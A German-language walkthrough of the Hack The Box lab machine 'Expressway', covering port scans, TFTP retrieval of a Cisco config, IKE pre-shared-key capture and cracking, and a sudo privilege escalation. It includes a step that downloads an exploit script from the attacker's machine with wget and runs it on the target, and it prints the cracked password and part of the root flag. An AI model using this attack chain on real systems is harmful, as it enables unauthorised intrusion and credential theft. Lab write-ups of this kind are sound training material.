# HTB — Expressway

**Metadaten**

```text
Target: 10.10.11.87
Name: HTB - Expressway
Datum: 2025-10-12
Autor: J0rg3
Status: Finished
```

---

# Server Status

Ziel: schnelle Verfügbarkeit prüfen — Ping / Erreichbarkeit.

```bash
# einmaliger Ping
ping 10.10.11.87 -c1
```

Beispielausgabe:
```text
64 bytes from 10.10.11.87: icmp_seq=1 ttl=63 time=20.1 ms
--- 10.10.11.87 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss
```

# Nmap-Scan (TCP / UDP)

## TCP Scan (voller Portscan)
Ziel: offene TCP-Ports und Dienstversionen erkennen.

```bash
# Voller TCP Portscan + Service-Detection
nmap -p- -T4 -sV 10.10.11.87 -vv -oN expressway_tcp_full.txt
```

Beispielauszug (relevant):
```text
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 10.0p2 Debian 8 (protocol 2.0)
```

> 💡 Hinweis: `-p-` scannt alle 65535 TCP-Ports. Für schnelleres Arbeiten kann `--top-ports 1000` verwendet werden.

---

## UDP Scan (Top-Ports / Hinweise)
Ziel: UDP-Dienste identifizieren (dauert länger, braucht sudo).

```bash
# UDP Top-Ports Scan (schneller) — benötigt root
sudo nmap -sU -p- -T4 10.10.11.87 -vv -oN expressway_udp_full.txt --top-ports 25
```

Beispielauszug:
```text
500/udp   open    isakmp
69/udp    open    tftp
4500/udp  open|filtered  nat-t-ike
53/udp    open|filtered  domain
```

> ⚠️ Hinweis: UDP-Scans sind oft `open|filtered` — kann zusätzliche Probe-Tools (z.B. `socat`, `ncat`) erfordern, um Dienstbanner zu bestätigen.

---

# TFTP-Enumeration

Ziel: öffentlich zugängliche TFTP-Dateien auflisten und herunterladen.

## NSE TFTP Scan (Nmap + tftp scripts)

```bash
# Nmap TFTP NSE Scan
nmap -p 69 -sV -sU --script tftp* 10.10.11.87 -vv -oN expressway_tftp_nse.txt
```

Beispielausgabe (wichtig):
```text
69/udp open  tftp    Netkit tftpd or atftpd
| tftp-enum:
|_  ciscortr.cfg
```

### Datei herunterladen 
```bash
# Interaktiver TFTP Download
tftp 10.10.11.87
tftp> get ciscortr.cfg
tftp> quit

```

> 💡 Hinweis: Manche TFTP-Dienste erlauben nur Reads oder sind restriktiv konfiguriert; `tftp-enum` in NSE hilft, vorhandene Dateinamen aufzuspüren.

---

## Wichtige Dateiauszüge / Hinweise

Beispielinhalt `ciscortr.cfg` (gekürzt / redacted):

```text
version 12.3
no service pad
service timestamps debug datetime msec
service timestamps log datetime msec
no service password-encryption
!
hostname expressway
!
enable password *****
!
username ike password *****
...
```

- `no service password-encryption` bedeutet häufig lesbare Passwörter in Konfigurationsdateien — wertvoll für weitere Enumeration.
- `username ike` legt einen Benutzer `ike` nahe — nützlich für spätere Authentifizierungsversuche.

> 🔎 Hinweis: Bei Cisco-Konfigurationen können Passwörter in verschiedenen Formen (enable secret, enable password, line vty, username secret) vorkommen. Prüfe, ob `enable password` oder `username ... password` tatsächlich plaintext ist.

---

# IKE / IPsec Enumeration

Ziel: aggressive Mode Informationen extrahieren, ID und PSK-hash vorbereiten.

## Aggressive Mode Handshake
```bash
# Grundscan (Aggressive Mode)
sudo ike-scan -A 10.10.11.87
```

Beispielausgabe enthält u. a.:
```
ID(Type=ID_USER_FQDN, Value=ike@expressway.htb)
VID=... (XAUTH)
```

## PSK-Handshake speichern / vollständiger Aggressive Mode
```bash
# Aggressive Mode mit Ausgabe der Hash-Parameter
sudo ike-scan -M -A -P ike.psk 10.10.11.87
```

> 💡 Hinweis: `-M` erzeugt Materialien (z. B. `ike.psk`) die zum Offline-Cracking genutzt werden können.

---

## PSK Extraktion & Cracking

```bash
# Cracken der extrahierten PSK (Beispiel mit psk-crack aus ike-scan tools)
psk-crack -d /usr/share/wordlists/rockyou.txt ike.psk
```

Beispielergebnis (erfolgreich):
```text
key "freakingrockstarontheroad" matches SHA1 hash ...
```

**Passwort (aus Crack)**: `freakingrockstarontheroad`

---

# sudo-Enumeration & Privilege Escalation (local)

Ziel: prüfen, ob lokale Schwachstellen / Sudo-Bugs zur Root-Escalation führen.

## Sudo Version prüfen

```bash
# lokal auf Zielhost (wenn du als user eingeloggt bist)
sudo -V
```

Beispielauszug:
```text
Sudo version 1.9.17
Sudoers policy plugin version 1.9.17
```

## Exploit-Suche (Searchsploit)
Nutze `searchsploit` lokal oder remote, um bekannte Exploits für die gefundene Version zu sehen.

```bash
# Suche nach sudo Exploits auf dem Angreifer-System
searchsploit sudo
```

Relevante Treffer z. B.:
```
Sudo 1.9.17 Host Option - Elevation of Privilege   | linux/local/52354.txt
Sudo chroot 1.9.17 - Local Privilege Escalation   | linux/local/52352.txt
```

### Ablauf — Exploit extrahieren, uploaden, ausführen (Beispielablauf)
1. Exploit extrahieren:
```bash
searchsploit -m 52352
cp 52352.txt exploit.sh
```

2. HTTP-Server zum einfachen Transfer starten:
```bash
# im Verzeichnis mit exploit.sh
python -m http.server 8000
```

3. Auf dem Zielhost (als verwundbarer Benutzer) herunterladen und ausführen:
```bash
# auf dem Ziel (ike@expressway)
wget http://<kali_ip>:8000/exploit.sh -O /tmp/exploit.sh
chmod +x /tmp/exploit.sh
/tmp/exploit.sh
```

Beispielausgabe (nach erfolgreichem Exploit):
```text
root@expressway:/# ls /root
root.txt
root@expressway:/root# cat root.txt
daba3be7b1974359f30c6a******
```
---

# Flags / Artefakte
- `root.txt` (Beispielinhalt, nur gekürzt in diesem Cheatsheet): `daba3be7b1974359f30c6a******`
- User: `ike`
- Gefundene Konfig-Datei: `ciscortr.cfg`
- Gefundene PSK (gecrackt): `freakingrockstarontheroad`

---

# Kurz-FAQ / Hinweise

- **Warum `ike-scan`?**  
  `ike-scan` hilft, IKE/IPsec Endpunkte zu fingerprinten und Aggressive Mode Handshakes für Offline-Cracking zu sammeln.

- **Warum TFTP interessant?**  
  TFTP wird oft in Netzwerkgeräten (Router, Switches, Telefonie) für Konfigurations- oder Firmware-Backups verwendet. Unverschlüsselte Konfigurationen enthalten oft Credentials.

- **UDP Scans sind langsam — was tun?**  
  Nutze `--top-ports` für erste Checks, erhöhe Zeitouts (`--host-timeout`, `--max-retries`) oder verwende gezielte Probe-Tools (z. B. `sipvicious`, `ike-scan`, `tftp` client) für einzelne Dienste.

---
